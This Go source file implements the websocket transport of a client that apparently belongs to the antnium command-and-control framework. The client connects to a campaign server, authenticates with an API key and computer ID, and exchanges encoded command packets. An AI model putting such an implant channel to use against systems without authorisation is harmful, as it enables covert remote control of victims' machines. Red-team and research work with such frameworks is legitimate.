package client

import (
	"encoding/json"
	"fmt"
	"strings"

	"github.com/dobin/antnium/pkg/campaign"
	"github.com/dobin/antnium/pkg/common"
	"github.com/dobin/antnium/pkg/model"
	"github.com/gorilla/websocket"
	log "github.com/sirupsen/logrus"
)

// UpstreamWs is a connection to the server via websocket
type UpstreamWs struct {
	chanIncoming chan model.Packet // Provides packets from server to client

	coder    model.Coder
	config   *ClientConfig
	campaign *campaign.Campaign

	wsConn *websocket.Conn // Our active websocket connection
}

func MakeUpstreamWs(config *ClientConfig, campaign *campaign.Campaign) UpstreamWs {
	coder := model.MakeCoder(campaign)

	u := UpstreamWs{
		make(chan model.Packet),
		coder,
		config,
		campaign,
		nil, // no active connection
	}
	return u
}

// Connect creates a WS connection to the server, or returns an error
func (u *UpstreamWs) Connect() error {
	//u := url.URL{Scheme: "ws", Host: *addr, Path: "/echo"}
	myUrl := strings.Replace(u.campaign.ServerUrl, "http", "ws", 1) + u.campaign.ClientWebsocketPath
	var ws *websocket.Conn
	var err error

	// Handle all proxy related settings in NewDialContext
	dialContext, err := NewDialContext(u.campaign)
	if err != nil {
		return err
	}
	dialer := websocket.Dialer{
		NetDialContext: dialContext,
	}
	ws, _, err = dialer.Dial(myUrl, nil)
	if err != nil {
		return fmt.Errorf("could not connect websocket with proxy to %s: %s", myUrl, err.Error())
	}

	// Authentication
	authToken := model.ClientWebSocketAuth{
		Key:        u.campaign.ApiKey,
		ComputerId: u.config.ComputerId,
	}
	data, err := json.Marshal(authToken)
	if err != nil {
		return err
	}
	err = ws.WriteMessage(websocket.TextMessage, data)
	if err != nil {
		return err
	}

	u.wsConn = ws

	return nil
}

// Start starts threads responsible to receveive/send packets from the server via WS. lifetime:websocket connection
func (u *UpstreamWs) Start() {
	// Thread: Incoming websocket message reader
	go func() {
		defer u.wsConn.Close()
		for {
			// Get packets (blocking)
			_, message, err := u.wsConn.ReadMessage()
			if err != nil {
				// e.g.: Server quit
				//log.Errorf("WS read error: %s", err.Error())

				// Notify that we are disconnected
				log.Debug("UpstreamWs: Start(): Close!")
				close(u.ChanIncoming()) // Notify UpstreamManager
				u.Shutdown()
				break // And exit thread
			}

			packet, err := u.coder.DecodeData(message)
			if err != nil {
				log.Errorf("UpstreamWs: Could not decode incoming message (ignore): %s", err.Error())
				continue
			}
			log.Debugf("UpstreamWs: Received from server via websocket")

			u.ChanIncoming() <- packet
		}
	}()
}

func (u *UpstreamWs) SendPacket(packet model.Packet) error {
	packetData, err := u.coder.EncodeData(packet)
	if err != nil {
		return fmt.Errorf("UpstreamWs: Could not encode outgoing packet")
	}
	common.LogPacketDebug("UpstreamWs:OutgoingThread", packet)

	if u.wsConn == nil {
		return fmt.Errorf("UpstreamWs: wsConn is nil, could not send packet %s", packet.PacketId)
	}

	err = u.wsConn.WriteMessage(websocket.TextMessage, packetData)
	if err != nil {
		return fmt.Errorf("UpstreamWs: could not write packet: %s", err.Error())
	}

	return nil
}

// Connected returns false if we know that that websocket connection is dead
func (u *UpstreamWs) Connected() bool {
	if u.wsConn == nil {
		return false
	} else {
		return true
	}
}

// Shutdown closes the underlying websocket
func (u *UpstreamWs) Shutdown() {
	u.wsConn.Close()
	u.wsConn = nil
}

func (u *UpstreamWs) ChanIncoming() chan model.Packet {
	return u.chanIncoming
}
